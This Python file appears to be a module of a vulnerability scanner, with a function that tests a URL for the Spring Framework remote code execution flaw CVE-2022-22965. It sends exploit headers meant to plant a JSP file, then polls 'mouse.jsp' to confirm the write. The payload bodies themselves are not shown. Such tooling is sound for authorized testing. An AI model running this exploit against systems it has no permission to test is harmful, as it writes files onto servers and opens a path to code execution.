#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.logger import logger
from thirdparty import requests
from time import sleep

def cve_2022_22965_scan(self, url):
    ''' Spring Framework 远程代码执行漏洞(Spring core RCE) '''
    vul_info = {}
    vul_info['app_name'] = self.app_name
    vul_info['vul_type'] = 'RCE'
    vul_info['vul_id'] = 'CVE-2022-22965'
    vul_info['vul_method'] = 'GET/POST'
    vul_info['headers'] = {
        'suffix': '%>//',
        'c1': 'Runtime',
        'c2': '<%',
        'DNT': '1'
    }

    headers = self.headers.copy()
    headers.update(vul_info['headers'])

    for payload in self.cve_2022_22965_payloads:    # * Payload
        path = payload['path']                      # * Path
        data = payload['data']                      # * Data
        target = url + path                         # * Target

        vul_info['path'] = path
        vul_info['data'] = data
        vul_info['target'] = target

        try:
            if data:
                res = requests.post(
                    target, 
                    timeout=self.timeout, 
                    headers=headers, 
                    data=data, 
                    proxies=self.proxies, 
                    verify=False
                )
            else:
                res = requests.get(
                    target, 
                    timeout=self.timeout, 
                    headers=headers, 
                    data=data, 
                    proxies=self.proxies, 
                    verify=False
                )
            logger.logging(vul_info, res.status_code, res)                        # * LOG

            verify_url = url + 'mouse.jsp'
            for i in range(3):
                sleep(2.5)                                # * 延时, 因为命令执行的回显可能有延迟, 要等一会判断结果才准确
                verify_res = requests.get(
                    verify_url, 
                    timeout=self.timeout, 
                    headers=self.headers,
                    proxies=self.proxies, 
                    verify=False,
                    allow_redirects=False
                )
                logger.logging(vul_info, verify_res.status_code, verify_res)

            if ((verify_res.status_code == 200) and ('CVE/2022/22965' in verify_res.text)):
                results = {
                    'Target': verify_url,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Payload': res
                }
                return results
        except requests.ConnectTimeout:
            logger.logging(vul_info, 'Timeout')
            return None
        except requests.ConnectionError:
            logger.logging(vul_info, 'Faild')
            return None
        except:
            logger.logging(vul_info, 'Error')
            return None
